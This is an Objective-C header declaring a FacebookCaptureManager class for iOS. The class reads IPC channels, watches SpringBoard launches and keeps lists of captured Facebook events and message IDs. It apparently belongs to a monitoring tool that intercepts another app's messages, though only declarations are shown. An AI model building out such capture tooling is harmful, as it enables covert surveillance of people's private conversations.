//
//  FacebookCaptureManager.h
//  FacebookCaptureManager
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"

@class SBDidLaunchNotifier;

@interface FacebookCaptureManager : NSObject <EventCapture, MessagePortIPCDelegate, SharedFile2IPCDelegate> {
@private
	id <EventDelegate>		mEventDelegate;
	
	MessagePortIPCReader	*mMessagePortReader;
	
	SharedFile2IPCReader	*mSharedFileReader1;
	
	SBDidLaunchNotifier		*mSBNotifier;
	NSMutableArray			*mFacebookEvents;
	NSMutableArray			*mFacebookMessageIDHistory;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;

@property (retain) NSMutableArray *mFacebookMessageIDHistory;

- (void) prerelease; // Call to cancel the self perform selector

@end
